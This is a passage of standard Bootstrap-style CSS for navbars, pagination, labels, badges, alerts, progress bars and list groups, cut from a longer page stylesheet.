        .navbar-fixed-top .navbar-collapse {
          max-height: 200px;
        }
      }
      .container-fluid > .navbar-collapse,
      .container-fluid > .navbar-header,
      .container > .navbar-collapse,
      .container > .navbar-header {
        margin-right: -15px;
        margin-left: -15px;
      }
      @media (min-width: 768px) {
        .container-fluid > .navbar-collapse,
        .container-fluid > .navbar-header,
        .container > .navbar-collapse,
        .container > .navbar-header {
          margin-right: 0;
          margin-left: 0;
        }
      }
      .navbar-static-top {
        z-index: 1000;
        border-width: 0 0 1px;
      }
      @media (min-width: 768px) {
        .navbar-static-top {
          border-radius: 0;
        }
      }
      .navbar-fixed-bottom,
      .navbar-fixed-top {
        position: fixed;
        right: 0;
        left: 0;
        z-index: 1030;
      }
      @media (min-width: 768px) {
        .navbar-fixed-bottom,
        .navbar-fixed-top {
          border-radius: 0;
        }
      }
      .navbar-fixed-top {
        top: 0;
        border-width: 0 0 1px;
      }
      .navbar-fixed-bottom {
        bottom: 0;
        margin-bottom: 0;
        border-width: 1px 0 0;
      }
      .navbar-brand {
        float: left;
        height: 50px;
        padding: 15px 15px;
        font-size: 18px;
        line-height: 20px;
      }
      .navbar-brand:focus,
      .navbar-brand:hover {
        text-decoration: none;
      }
      .navbar-brand > img {
        display: block;
      }
      @media (min-width: 768px) {
        .navbar > .container .navbar-brand,
        .navbar > .container-fluid .navbar-brand {
          margin-left: -15px;
        }
      }
      .navbar-toggle {
        position: relative;
        float: right;
        padding: 9px 10px;
        margin-top: 8px;
        margin-right: 15px;
        margin-bottom: 8px;
        background-color: transparent;
        background-image: none;
        border: 1px solid transparent;
        border-radius: 4px;
      }
      .navbar-toggle:focus {
        outline: 0;
      }
      .navbar-toggle .icon-bar {
        display: block;
        width: 22px;
        height: 2px;
        border-radius: 1px;
      }
      .navbar-toggle .icon-bar + .icon-bar {
        margin-top: 4px;
      }
      @media (min-width: 768px) {
        .navbar-toggle {
          display: none;
        }
      }
      .navbar-nav {
        margin: 7.5px -15px;
      }
      .navbar-nav > li > a {
        padding-top: 10px;
        padding-bottom: 10px;
        line-height: 20px;
      }
      @media (max-width: 767px) {
        .navbar-nav .open .dropdown-menu {
          position: static;
          float: none;
          width: auto;
          margin-top: 0;
          background-color: transparent;
          border: 0;
          -webkit-box-shadow: none;
          box-shadow: none;
        }
        .navbar-nav .open .dropdown-menu .dropdown-header,
        .navbar-nav .open .dropdown-menu > li > a {
          padding: 5px 15px 5px 25px;
        }
        .navbar-nav .open .dropdown-menu > li > a {
          line-height: 20px;
        }
        .navbar-nav .open .dropdown-menu > li > a:focus,
        .navbar-nav .open .dropdown-menu > li > a:hover {
          background-image: none;
        }
      }
      @media (min-width: 768px) {
        .navbar-nav {
          float: left;
          margin: 0;
        }
        .navbar-nav > li {
          float: left;
        }
        .navbar-nav > li > a {
          padding-top: 15px;
          padding-bottom: 15px;
        }
      }
      .navbar-form {
        padding: 10px 15px;
        margin-top: 8px;
        margin-right: -15px;
        margin-bottom: 8px;
        margin-left: -15px;
        border-top: 1px solid transparent;
        border-bottom: 1px solid transparent;
        -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 0 rgba(255, 255, 255, 0.1);
        box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 0 rgba(255, 255, 255, 0.1);
      }
      @media (min-width: 768px) {
        .navbar-form .form-group {
          display: inline-block;
          margin-bottom: 0;
          vertical-align: middle;
        }
        .navbar-form .form-control {
          display: inline-block;
          width: auto;
          vertical-align: middle;
        }
        .navbar-form .form-control-static {
          display: inline-block;
        }
        .navbar-form .input-group {
          display: inline-table;
          vertical-align: middle;
        }
        .navbar-form .input-group .form-control,
        .navbar-form .input-group .input-group-addon,
        .navbar-form .input-group .input-group-btn {
          width: auto;
        }
        .navbar-form .input-group > .form-control {
          width: 100%;
        }
        .navbar-form .control-label {
          margin-bottom: 0;
          vertical-align: middle;
        }
        .navbar-form .checkbox,
        .navbar-form .radio {
          display: inline-block;
          margin-top: 0;
          margin-bottom: 0;
          vertical-align: middle;
        }
        .navbar-form .checkbox label,
        .navbar-form .radio label {
          padding-left: 0;
        }
        .navbar-form .checkbox input[type="checkbox"],
        .navbar-form .radio input[type="radio"] {
          position: relative;
          margin-left: 0;
        }
        .navbar-form .has-feedback .form-control-feedback {
          top: 0;
        }
      }
      @media (max-width: 767px) {
        .navbar-form .form-group {
          margin-bottom: 5px;
        }
        .navbar-form .form-group:last-child {
          margin-bottom: 0;
        }
      }
      @media (min-width: 768px) {
        .navbar-form {
          width: auto;
          padding-top: 0;
          padding-bottom: 0;
          margin-right: 0;
          margin-left: 0;
          border: 0;
          -webkit-box-shadow: none;
          box-shadow: none;
        }
      }
      .navbar-nav > li > .dropdown-menu {
        margin-top: 0;
        border-top-left-radius: 0;
        border-top-right-radius: 0;
      }
      .navbar-fixed-bottom .navbar-nav > li > .dropdown-menu {
        margin-bottom: 0;
        border-top-left-radius: 4px;
        border-top-right-radius: 4px;
        border-bottom-right-radius: 0;
        border-bottom-left-radius: 0;
      }
      .navbar-btn {
        margin-top: 8px;
        margin-bottom: 8px;
      }
      .navbar-btn.btn-sm {
        margin-top: 10px;
        margin-bottom: 10px;
      }
      .navbar-btn.btn-xs {
        margin-top: 14px;
        margin-bottom: 14px;
      }
      .navbar-text {
        margin-top: 15px;
        margin-bottom: 15px;
      }
      @media (min-width: 768px) {
        .navbar-text {
          float: left;
          margin-right: 15px;
          margin-left: 15px;
        }
      }
      @media (min-width: 768px) {
        .navbar-left {
          float: left !important;
        }
        .navbar-right {
          float: right !important;
          margin-right: -15px;
        }
        .navbar-right ~ .navbar-right {
          margin-right: 0;
        }
      }
      .navbar-default {
        background-color: #f8f8f8;
        border-color: #e7e7e7;
      }
      .navbar-default .navbar-brand {
        color: #777;
      }
      .navbar-default .navbar-brand:focus,
      .navbar-default .navbar-brand:hover {
        color: #5e5e5e;
        background-color: transparent;
      }
      .navbar-default .navbar-text {
        color: #777;
      }
      .navbar-default .navbar-nav > li > a {
        color: #777;
      }
      .navbar-default .navbar-nav > li > a:focus,
      .navbar-default .navbar-nav > li > a:hover {
        color: #333;
        background-color: transparent;
      }
      .navbar-default .navbar-nav > .active > a,
      .navbar-default .navbar-nav > .active > a:focus,
      .navbar-default .navbar-nav > .active > a:hover {
        color: #555;
        background-color: #e7e7e7;
      }
      .navbar-default .navbar-nav > .disabled > a,
      .navbar-default .navbar-nav > .disabled > a:focus,
      .navbar-default .navbar-nav > .disabled > a:hover {
        color: #ccc;
        background-color: transparent;
      }
      .navbar-default .navbar-toggle {
        border-color: #ddd;
      }
      .navbar-default .navbar-toggle:focus,
      .navbar-default .navbar-toggle:hover {
        background-color: #ddd;
      }
      .navbar-default .navbar-toggle .icon-bar {
        background-color: #888;
      }
      .navbar-default .navbar-collapse,
      .navbar-default .navbar-form {
        border-color: #e7e7e7;
      }
      .navbar-default .navbar-nav > .open > a,
      .navbar-default .navbar-nav > .open > a:focus,
      .navbar-default .navbar-nav > .open > a:hover {
        color: #555;
        background-color: #e7e7e7;
      }
      @media (max-width: 767px) {
        .navbar-default .navbar-nav .open .dropdown-menu > li > a {
          color: #777;
        }
        .navbar-default .navbar-nav .open .dropdown-menu > li > a:focus,
        .navbar-default .navbar-nav .open .dropdown-menu > li > a:hover {
          color: #333;
          background-color: transparent;
        }
        .navbar-default .navbar-nav .open .dropdown-menu > .active > a,
        .navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus,
        .navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover {
          color: #555;
          background-color: #e7e7e7;
        }
        .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,
        .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus,
        .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover {
          color: #ccc;
          background-color: transparent;
        }
      }
      .navbar-default .navbar-link {
        color: #777;
      }
      .navbar-default .navbar-link:hover {
        color: #333;
      }
      .navbar-default .btn-link {
        color: #777;
      }
      .navbar-default .btn-link:focus,
      .navbar-default .btn-link:hover {
        color: #333;
      }
      .navbar-default .btn-link[disabled]:focus,
      .navbar-default .btn-link[disabled]:hover,
      fieldset[disabled] .navbar-default .btn-link:focus,
      fieldset[disabled] .navbar-default .btn-link:hover {
        color: #ccc;
      }
      .navbar-inverse {
        background-color: #222;
        border-color: #080808;
      }
      .navbar-inverse .navbar-brand {
        color: #9d9d9d;
      }
      .navbar-inverse .navbar-brand:focus,
      .navbar-inverse .navbar-brand:hover {
        color: #fff;
        background-color: transparent;
      }
      .navbar-inverse .navbar-text {
        color: #9d9d9d;
      }
      .navbar-inverse .navbar-nav > li > a {
        color: #9d9d9d;
      }
      .navbar-inverse .navbar-nav > li > a:focus,
      .navbar-inverse .navbar-nav > li > a:hover {
        color: #fff;
        background-color: transparent;
      }
      .navbar-inverse .navbar-nav > .active > a,
      .navbar-inverse .navbar-nav > .active > a:focus,
      .navbar-inverse .navbar-nav > .active > a:hover {
        color: #fff;
        background-color: #080808;
      }
      .navbar-inverse .navbar-nav > .disabled > a,
      .navbar-inverse .navbar-nav > .disabled > a:focus,
      .navbar-inverse .navbar-nav > .disabled > a:hover {
        color: #444;
        background-color: transparent;
      }
      .navbar-inverse .navbar-toggle {
        border-color: #333;
      }
      .navbar-inverse .navbar-toggle:focus,
      .navbar-inverse .navbar-toggle:hover {
        background-color: #333;
      }
      .navbar-inverse .navbar-toggle .icon-bar {
        background-color: #fff;
      }
      .navbar-inverse .navbar-collapse,
      .navbar-inverse .navbar-form {
        border-color: #101010;
      }
      .navbar-inverse .navbar-nav > .open > a,
      .navbar-inverse .navbar-nav > .open > a:focus,
      .navbar-inverse .navbar-nav > .open > a:hover {
        color: #fff;
        background-color: #080808;
      }
      @media (max-width: 767px) {
        .navbar-inverse .navbar-nav .open .dropdown-menu > .dropdown-header {
          border-color: #080808;
        }
        .navbar-inverse .navbar-nav .open .dropdown-menu .divider {
          background-color: #080808;
        }
        .navbar-inverse .navbar-nav .open .dropdown-menu > li > a {
          color: #9d9d9d;
        }
        .navbar-inverse .navbar-nav .open .dropdown-menu > li > a:focus,
        .navbar-inverse .navbar-nav .open .dropdown-menu > li > a:hover {
          color: #fff;
          background-color: transparent;
        }
        .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a,
        .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a:focus,
        .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a:hover {
          color: #fff;
          background-color: #080808;
        }
        .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a,
        .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a:focus,
        .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a:hover {
          color: #444;
          background-color: transparent;
        }
      }
      .navbar-inverse .navbar-link {
        color: #9d9d9d;
      }
      .navbar-inverse .navbar-link:hover {
        color: #fff;
      }
      .navbar-inverse .btn-link {
        color: #9d9d9d;
      }
      .navbar-inverse .btn-link:focus,
      .navbar-inverse .btn-link:hover {
        color: #fff;
      }
      .navbar-inverse .btn-link[disabled]:focus,
      .navbar-inverse .btn-link[disabled]:hover,
      fieldset[disabled] .navbar-inverse .btn-link:focus,
      fieldset[disabled] .navbar-inverse .btn-link:hover {
        color: #444;
      }
      .breadcrumb {
        padding: 8px 15px;
        margin-bottom: 20px;
        list-style: none;
        background-color: #f5f5f5;
        border-radius: 4px;
      }
      .breadcrumb > li {
        display: inline-block;
      }
      .breadcrumb > li + li:before {
        padding: 0 5px;
        color: #ccc;
        content: "/\00a0";
      }
      .breadcrumb > .active {
        color: #777;
      }
      .pagination {
        display: inline-block;
        padding-left: 0;
        margin: 20px 0;
        border-radius: 4px;
      }
      .pagination > li {
        display: inline;
      }
      .pagination > li > a,
      .pagination > li > span {
        position: relative;
        float: left;
        padding: 6px 12px;
        margin-left: -1px;
        line-height: 1.42857143;
        color: #337ab7;
        text-decoration: none;
        background-color: #fff;
        border: 1px solid #ddd;
      }
      .pagination > li:first-child > a,
      .pagination > li:first-child > span {
        margin-left: 0;
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px;
      }
      .pagination > li:last-child > a,
      .pagination > li:last-child > span {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px;
      }
      .pagination > li > a:focus,
      .pagination > li > a:hover,
      .pagination > li > span:focus,
      .pagination > li > span:hover {
        z-index: 2;
        color: #23527c;
        background-color: #eee;
        border-color: #ddd;
      }
      .pagination > .active > a,
      .pagination > .active > a:focus,
      .pagination > .active > a:hover,
      .pagination > .active > span,
      .pagination > .active > span:focus,
      .pagination > .active > span:hover {
        z-index: 3;
        color: #fff;
        cursor: default;
        background-color: #337ab7;
        border-color: #337ab7;
      }
      .pagination > .disabled > a,
      .pagination > .disabled > a:focus,
      .pagination > .disabled > a:hover,
      .pagination > .disabled > span,
      .pagination > .disabled > span:focus,
      .pagination > .disabled > span:hover {
        color: #777;
        cursor: not-allowed;
        background-color: #fff;
        border-color: #ddd;
      }
      .pagination-lg > li > a,
      .pagination-lg > li > span {
        padding: 10px 16px;
        font-size: 18px;
        line-height: 1.3333333;
      }
      .pagination-lg > li:first-child > a,
      .pagination-lg > li:first-child > span {
        border-top-left-radius: 6px;
        border-bottom-left-radius: 6px;
      }
      .pagination-lg > li:last-child > a,
      .pagination-lg > li:last-child > span {
        border-top-right-radius: 6px;
        border-bottom-right-radius: 6px;
      }
      .pagination-sm > li > a,
      .pagination-sm > li > span {
        padding: 5px 10px;
        font-size: 12px;
        line-height: 1.5;
      }
      .pagination-sm > li:first-child > a,
      .pagination-sm > li:first-child > span {
        border-top-left-radius: 3px;
        border-bottom-left-radius: 3px;
      }
      .pagination-sm > li:last-child > a,
      .pagination-sm > li:last-child > span {
        border-top-right-radius: 3px;
        border-bottom-right-radius: 3px;
      }
      .pager {
        padding-left: 0;
        margin: 20px 0;
        text-align: center;
        list-style: none;
      }
      .pager li {
        display: inline;
      }
      .pager li > a,
      .pager li > span {
        display: inline-block;
        padding: 5px 14px;
        background-color: #fff;
        border: 1px solid #ddd;
        border-radius: 15px;
      }
      .pager li > a:focus,
      .pager li > a:hover {
        text-decoration: none;
        background-color: #eee;
      }
      .pager .next > a,
      .pager .next > span {
        float: right;
      }
      .pager .previous > a,
      .pager .previous > span {
        float: left;
      }
      .pager .disabled > a,
      .pager .disabled > a:focus,
      .pager .disabled > a:hover,
      .pager .disabled > span {
        color: #777;
        cursor: not-allowed;
        background-color: #fff;
      }
      .label {
        display: inline;
        padding: 0.2em 0.6em 0.3em;
        font-size: 75%;
        font-weight: 700;
        line-height: 1;
        color: #fff;
        text-align: center;
        white-space: nowrap;
        vertical-align: baseline;
        border-radius: 0.25em;
      }
      a.label:focus,
      a.label:hover {
        color: #fff;
        text-decoration: none;
        cursor: pointer;
      }
      .label:empty {
        display: none;
      }
      .btn .label {
        position: relative;
        top: -1px;
      }
      .label-default {
        background-color: #777;
      }
      .label-default[href]:focus,
      .label-default[href]:hover {
        background-color: #5e5e5e;
      }
      .label-primary {
        background-color: #337ab7;
      }
      .label-primary[href]:focus,
      .label-primary[href]:hover {
        background-color: #286090;
      }
      .label-success {
        background-color: #5cb85c;
      }
      .label-success[href]:focus,
      .label-success[href]:hover {
        background-color: #449d44;
      }
      .label-info {
        background-color: #5bc0de;
      }
      .label-info[href]:focus,
      .label-info[href]:hover {
        background-color: #31b0d5;
      }
      .label-warning {
        background-color: #f0ad4e;
      }
      .label-warning[href]:focus,
      .label-warning[href]:hover {
        background-color: #ec971f;
      }
      .label-danger {
        background-color: #d9534f;
      }
      .label-danger[href]:focus,
      .label-danger[href]:hover {
        background-color: #c9302c;
      }
      .badge {
        display: inline-block;
        min-width: 10px;
        padding: 3px 7px;
        font-size: 12px;
        font-weight: 700;
        line-height: 1;
        color: #fff;
        text-align: center;
        white-space: nowrap;
        vertical-align: middle;
        background-color: #777;
        border-radius: 10px;
      }
      .badge:empty {
        display: none;
      }
      .btn .badge {
        position: relative;
        top: -1px;
      }
      .btn-group-xs > .btn .badge,
      .btn-xs .badge {
        top: 0;
        padding: 1px 5px;
      }
      a.badge:focus,
      a.badge:hover {
        color: #fff;
        text-decoration: none;
        cursor: pointer;
      }
      .list-group-item.active > .badge,
      .nav-pills > .active > a > .badge {
        color: #337ab7;
        background-color: #fff;
      }
      .list-group-item > .badge {
        float: right;
      }
      .list-group-item > .badge + .badge {
        margin-right: 5px;
      }
      .nav-pills > li > a > .badge {
        margin-left: 3px;
      }
      .jumbotron {
        padding-top: 30px;
        padding-bottom: 30px;
        margin-bottom: 30px;
        color: inherit;
        background-color: #eee;
      }
      .jumbotron .h1,
      .jumbotron h1 {
        color: inherit;
      }
      .jumbotron p {
        margin-bottom: 15px;
        font-size: 21px;
        font-weight: 200;
      }
      .jumbotron > hr {
        border-top-color: #d5d5d5;
      }
      .container .jumbotron,
      .container-fluid .jumbotron {
        padding-right: 15px;
        padding-left: 15px;
        border-radius: 6px;
      }
      .jumbotron .container {
        max-width: 100%;
      }
      @media screen and (min-width: 768px) {
        .jumbotron {
          padding-top: 48px;
          padding-bottom: 48px;
        }
        .container .jumbotron,
        .container-fluid .jumbotron {
          padding-right: 60px;
          padding-left: 60px;
        }
        .jumbotron .h1,
        .jumbotron h1 {
          font-size: 63px;
        }
      }
      .thumbnail {
        display: block;
        padding: 4px;
        margin-bottom: 20px;
        line-height: 1.42857143;
        background-color: #fff;
        border: 1px solid #ddd;
        border-radius: 4px;
        -webkit-transition: border 0.2s ease-in-out;
        -o-transition: border 0.2s ease-in-out;
        transition: border 0.2s ease-in-out;
      }
      .thumbnail a > img,
      .thumbnail > img {
        margin-right: auto;
        margin-left: auto;
      }
      a.thumbnail.active,
      a.thumbnail:focus,
      a.thumbnail:hover {
        border-color: #337ab7;
      }
      .thumbnail .caption {
        padding: 9px;
        color: #333;
      }
      .alert {
        padding: 15px;
        margin-bottom: 20px;
        border: 1px solid transparent;
        border-radius: 4px;
      }
      .alert h4 {
        margin-top: 0;
        color: inherit;
      }
      .alert .alert-link {
        font-weight: 700;
      }
      .alert > p,
      .alert > ul {
        margin-bottom: 0;
      }
      .alert > p + p {
        margin-top: 5px;
      }
      .alert-dismissable,
      .alert-dismissible {
        padding-right: 35px;
      }
      .alert-dismissable .close,
      .alert-dismissible .close {
        position: relative;
        top: -2px;
        right: -21px;
        color: inherit;
      }
      .alert-success {
        color: #3c763d;
        background-color: #dff0d8;
        border-color: #d6e9c6;
      }
      .alert-success hr {
        border-top-color: #c9e2b3;
      }
      .alert-success .alert-link {
        color: #2b542c;
      }
      .alert-info {
        color: #31708f;
        background-color: #d9edf7;
        border-color: #bce8f1;
      }
      .alert-info hr {
        border-top-color: #a6e1ec;
      }
      .alert-info .alert-link {
        color: #245269;
      }
      .alert-warning {
        color: #8a6d3b;
        background-color: #fcf8e3;
        border-color: #faebcc;
      }
      .alert-warning hr {
        border-top-color: #f7e1b5;
      }
      .alert-warning .alert-link {
        color: #66512c;
      }
      .alert-danger {
        color: #a94442;
        background-color: #f2dede;
        border-color: #ebccd1;
      }
      .alert-danger hr {
        border-top-color: #e4b9c0;
      }
      .alert-danger .alert-link {
        color: #843534;
      }
      @-webkit-keyframes progress-bar-stripes {
        from {
          background-position: 40px 0;
        }
        to {
          background-position: 0 0;
        }
      }
      @-o-keyframes progress-bar-stripes {
        from {
          background-position: 40px 0;
        }
        to {
          background-position: 0 0;
        }
      }
      @keyframes progress-bar-stripes {
        from {
          background-position: 40px 0;
        }
        to {
          background-position: 0 0;
        }
      }
      .progress {
        height: 20px;
        margin-bottom: 20px;
        overflow: hidden;
        background-color: #f5f5f5;
        border-radius: 4px;
        -webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
        box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
      }
      .progress-bar {
        float: left;
        width: 0;
        height: 100%;
        font-size: 12px;
        line-height: 20px;
        color: #fff;
        text-align: center;
        background-color: #337ab7;
        -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
        box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
        -webkit-transition: width 0.6s ease;
        -o-transition: width 0.6s ease;
        transition: width 0.6s ease;
      }
      .progress-bar-striped,
      .progress-striped .progress-bar {
        background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        -webkit-background-size: 40px 40px;
        background-size: 40px 40px;
      }
      .progress-bar.active,
      .progress.active .progress-bar {
        -webkit-animation: progress-bar-stripes 2s linear infinite;
        -o-animation: progress-bar-stripes 2s linear infinite;
        animation: progress-bar-stripes 2s linear infinite;
      }
      .progress-bar-success {
        background-color: #5cb85c;
      }
      .progress-striped .progress-bar-success {
        background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
      }
      .progress-bar-info {
        background-color: #5bc0de;
      }
      .progress-striped .progress-bar-info {
        background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
      }
      .progress-bar-warning {
        background-color: #f0ad4e;
      }
      .progress-striped .progress-bar-warning {
        background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
      }
      .progress-bar-danger {
        background-color: #d9534f;
      }
      .progress-striped .progress-bar-danger {
        background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
      }
      .media {
        margin-top: 15px;
      }
      .media:first-child {
        margin-top: 0;
      }
      .media,
      .media-body {
        overflow: hidden;
        zoom: 1;
      }
      .media-body {
        width: 10000px;
      }
      .media-object {
        display: block;
      }
      .media-object.img-thumbnail {
        max-width: none;
      }
      .media-right,
      .media > .pull-right {
        padding-left: 10px;
      }
      .media-left,
      .media > .pull-left {
        padding-right: 10px;
      }
      .media-body,
      .media-left,
      .media-right {
        display: table-cell;
        vertical-align: top;
      }
      .media-middle {
        vertical-align: middle;
      }
      .media-bottom {
        vertical-align: bottom;
      }
      .media-heading {
        margin-top: 0;
        margin-bottom: 5px;
      }
      .media-list {
        padding-left: 0;
        list-style: none;
      }
      .list-group {
        padding-left: 0;
        margin-bottom: 20px;
      }
      .list-group-item {
        position: relative;
        display: block;
        padding: 10px 15px;
        margin-bottom: -1px;
        background-color: #fff;
        border: 1px solid #ddd;
      }
      .list-group-item:first-child {
        border-top-left-radius: 4px;
        border-top-right-radius: 4px;
      }
      .list-group-item:last-child {
        margin-bottom: 0;
        border-bottom-right-radius: 4px;
        border-bottom-left-radius: 4px;
      }
      a.list-group-item,
      button.list-group-item {
        color: #555;
      }
      a.list-group-item .list-group-item-heading,
      button.list-group-item .list-group-item-heading {
        color: #333;
      }
      a.list-group-item:focus,
      a.list-group-item:hover,
      button.list-group-item:focus,
      button.list-group-item:hover {
        color: #555;
        text-decoration: none;
        background-color: #f5f5f5;
      }
      button.list-group-item {
        width: 100%;
        text-align: left;
      }
      .list-group-item.disabled,
      .list-group-item.disabled:focus,
      .list-group-item.disabled:hover {
        color: #777;
        cursor: not-allowed;
        background-color: #eee;
      }
      .list-group-item.disabled .list-group-item-heading,
      .list-group-item.disabled:focus .list-group-item-heading,
      .list-group-item.disabled:hover .list-group-item-heading {
        color: inherit;
      }
      .list-group-item.disabled .list-group-item-text,
      .list-group-item.disabled:focus .list-group-item-text,
      .list-group-item.disabled:hover .list-group-item-text {
        color: #777;
      }
      .list-group-item.active,
      .list-group-item.active:focus,
      .list-group-item.active:hover {
        z-index: 2;
        color: #fff;
        background-color: #337ab7;
        border-color: #337ab7;
      }
      .list-group-item.active .list-group-item-heading,
      .list-group-item.active .list-group-item-heading > .small,
      .list-group-item.active .list-group-item-heading > small,
      .list-group-item.active:focus .list-group-item-heading,
      .list-group-item.active:focus .list-group-item-heading > .small,
      .list-group-item.active:focus .list-group-item-heading > small,
      .list-group-item.active:hover .list-group-item-heading,
      .list-group-item.active:hover .list-group-item-heading > .small,
      .list-group-item.active:hover .list-group-item-heading > small {
        color: inherit;
      }
      .list-group-item.active .list-group-item-text,
      .list-group-item.active:focus .list-group-item-text,
      .list-group-item.active:hover .list-group-item-text {
        color: #c7ddef;
      }
      .list-group-item-success {
        color: #3c763d;
        background-color: #dff0d8;
      }
      a.list-group-item-success,
      button.list-group-item-success {
        color: #3c763d;
      }
      a.list-group-item-success .list-group-item-heading,
      button.list-group-item-success .list-group-item-heading {
        color: inherit;
      }
      a.list-group-item-success:focus,
      a.list-group-item-success:hover,
      button.list-group-item-success:focus,
      button.list-group-item-success:hover {
        color: #3c763d;
        background-color: #d0e9c6;
      }
      a.list-group-item-success.active,
      a.list-group-item-success.active:focus,
      a.list-group-item-success.active:hover,
      button.list-group-item-success.active,
      button.list-group-item-success.active:focus,
      button.list-group-item-success.active:hover {
        color: #fff;
        background-color: #3c763d;
        border-color: #3c763d;
      }
      .list-group-item-info {
        color: #31708f;
        background-color: #d9edf7;
      }
      a.list-group-item-info,
      button.list-group-item-info {
        color: #31708f;
      }
      a.list-group-item-info .list-group-item-heading,
      button.list-group-item-info .list-group-item-heading {
        color: inherit;
      }
      a.list-group-item-info:focus,
      a.list-group-item-info:hover,
      button.list-group-item-info:focus,
      button.list-group-item-info:hover {
        color: #31708f;
        background-color: #c4e3f3;
      }
      a.list-group-item-info.active,
      a.list-group-item-info.active:focus,
      a.list-group-item-info.active:hover,
      button.list-group-item-info.active,
      button.list-group-item-info.active:focus,
      button.list-group-item-info.active:hover {
        color: #fff;
        background-color: #31708f;
        border-color: #31708f;
      }
      .list-group-item-warning {
        color: #8a6d3b;
        background-color: #fcf8e3;
      }
      a.list-group-item-warning,
      button.list-group-item-warning {
        color: #8a6d3b;
      }
      a.list-group-item-warning .list-group-item-heading,
      button.list-group-item-warning .list-group-item-heading {
        color: inherit;
      }
      a.list-group-item-warning:focus,
      a.list-group-item-warning:hover,
      button.list-group-item-warning:focus,
      button.list-group-item-warning:hover {
        color: #8a6d3b;
        background-color: #faf2cc;
      }
      a.list-group-item-warning.active,
      a.list-group-item-warning.active:focus,
      a.list-group-item-warning.active:hover,
      button.list-group-item-warning.active,
      button.list-group-item-warning.active:focus,
      button.list-group-item-warning.active:hover {
        color: #fff;
        background-color: #8a6d3b;
        border-color: #8a6d3b;
      }
      .list-group-item-danger {
        color: #a94442;
        background-color: #f2dede;
      }
      a.list-group-item-danger,
      button.list-group-item-danger {
        color: #a94442;
      }
      a.list-group-item-danger .list-group-item-heading,
      button.list-group-item-danger .list-group-item-heading {
        color: inherit;
      }
      a.list-group-item-danger:focus,
      a.list-group-item-danger:hover,
      button.list-group-item-danger:focus,
      button.list-group-item-danger:hover {
        color: #a94442;
        background-color: #ebcccc;
      }
      a.list-group-item-danger.active,
      a.list-group-item-danger.active:focus,
      a.list-group-item-danger.active:hover,
      button.list-group-item-danger.active,
      button.list-group-item-danger.active:focus,
      button.list-group-item-danger.active:hover {
        color: #fff;
        background-color: #a94442;
        border-color: #a94442;
      }
      .list-group-item-heading {
        margin-top: 0;
        margin-bottom: 5px;
      }
